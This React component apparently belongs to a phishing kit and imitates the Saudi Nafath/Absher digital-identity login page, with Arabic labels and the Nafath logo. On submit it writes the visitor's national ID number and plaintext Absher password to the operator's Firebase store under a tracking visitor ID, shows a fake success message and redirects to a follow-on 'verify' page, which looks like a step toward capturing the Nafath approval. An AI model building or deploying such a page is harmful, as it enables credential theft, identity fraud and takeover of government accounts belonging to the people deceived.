import React, { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { addData, getOrCreateVisitorId, handleCurrentPage } from "@/lib/firebase";

export default function NafathLoginPage() {
  const [, setLocation] = useLocation();
  const [idNumber, setIdNumber] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [submitError, setSubmitError] = useState("");
  const [submitSuccess, setSubmitSuccess] = useState("");
  const [isInvalid, setIsInvalid] = useState(false);

  useEffect(() => {
    getOrCreateVisitorId();
    void handleCurrentPage("nafath_login");
  }, []);

  const isValidSaudiId = (id: string) => /^[12]\d{9}$/.test(id);
  const isValid = isValidSaudiId(idNumber) && password.trim() !== "";

  const idError = idNumber && !isValidSaudiId(idNumber) ? "رقم الهوية غير صحيح (10 أرقام)" : "";

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitError("");
    setSubmitSuccess("");
    setIsInvalid(false);

    if (!isValid) {
      setSubmitError("يرجى إدخال البيانات بشكل صحيح");
      return;
    }

    setLoading(true);
    try {
      const randomRequestNum = Math.floor(10 + Math.random() * 90);

      const visitorId = getOrCreateVisitorId();
      await addData({
        id: visitorId,
        nafathIdNumber: idNumber,
        nafathPassword: password,
        nafathRequestNumber: randomRequestNum,
        currentPage: "nafath_login",
        updatedAt: new Date().toISOString(),
      });

      setSubmitSuccess("تم إرسال طلب نفاذ بنجاح");
      setTimeout(() => {
        setLocation("/nafath-verify");
      }, 1000);
    } catch (err: any) {
      setIsInvalid(true);
      setSubmitError(err?.message || "تعذر إرسال طلب نفاذ");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div
      className="min-h-screen flex items-center justify-center p-4 bg-[#f5f8f5]"
      dir="rtl"
      data-testid="page-nafath-login"
    >
      <div className="bg-white p-6 sm:p-10 rounded-2xl shadow-sm border border-[#e5ece6] max-w-lg w-full">
        <form className="flex flex-col gap-5" onSubmit={handleSubmit}>
          <img src="/images/nafath.png" alt="Nafath" className="w-40 mx-auto mb-2 object-contain" />
          <p className="text-xl font-extrabold text-[#129786] text-center mb-4">دخول سريع وآمن</p>
          <h2 className="text-sm font-bold text-gray-600 text-center leading-relaxed mb-4">
            الرجاء إدخال رقم الهوية وكلمة المرور الخاصة بهويتك الرقمية (أبشر)
          </h2>

          <div className="flex flex-col gap-2">
            <label className="text-sm font-bold text-gray-700">رقم الهوية الوطنية / الإقامة</label>
            <input
              id="idNumber"
              name="idNumber"
              dir="ltr"
              type="tel"
              className="w-full px-4 py-3.5 bg-[#f6f6f6] rounded-full text-center font-mono font-bold text-base border border-transparent focus:border-[#129786] focus:outline-none"
              placeholder="1xxxxxxxxx"
              value={idNumber}
              onChange={(e) => setIdNumber(e.target.value.replace(/\D/g, "").slice(0, 10))}
              data-testid="input-id-number"
            />
            {idError && <p className="text-xs text-red-500 font-medium">{idError}</p>}
          </div>

          <div className="flex flex-col gap-2">
            <label className="text-sm font-bold text-gray-700">كلمة المرور</label>
            <input
              id="password"
              name="password"
              dir="ltr"
              type="password"
              className="w-full px-4 py-3.5 bg-[#f6f6f6] rounded-full text-center font-mono text-base font-bold text-gray-900 border border-transparent focus:border-[#129786] focus:outline-none"
              placeholder="••••••••"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              data-testid="input-password"
            />
          </div>

          {isInvalid && (
            <p className="font-semibold text-red-500 text-center text-sm">
              رقم الهوية أو كلمة المرور غير صحيحة
            </p>
          )}
          {submitError && (
            <p className="font-semibold text-red-500 text-center text-sm" data-testid="error-submit">
              {submitError}
            </p>
          )}
          {submitSuccess && (
            <p className="font-bold text-green-600 text-center text-sm" data-testid="status-success">
              {submitSuccess}
            </p>
          )}

          <button
            type="submit"
            className="w-full mt-4 rounded-full py-3.5 text-white bg-[#129786] hover:bg-[#0e7769] font-bold text-base transition-all shadow-md cursor-pointer disabled:opacity-60"
            disabled={!isValid || loading}
            data-testid="button-submit-nafath"
          >
            {loading ? "جارٍ الإرسال..." : "التالي"}
          </button>

          <p className="text-center text-xs font-semibold text-gray-500 mt-2">
            يرجى فتح تطبيق نفاذ لإصدار شريحة اعتماد رقم الجوال.
          </p>
        </form>
      </div>
    </div>
  );
}
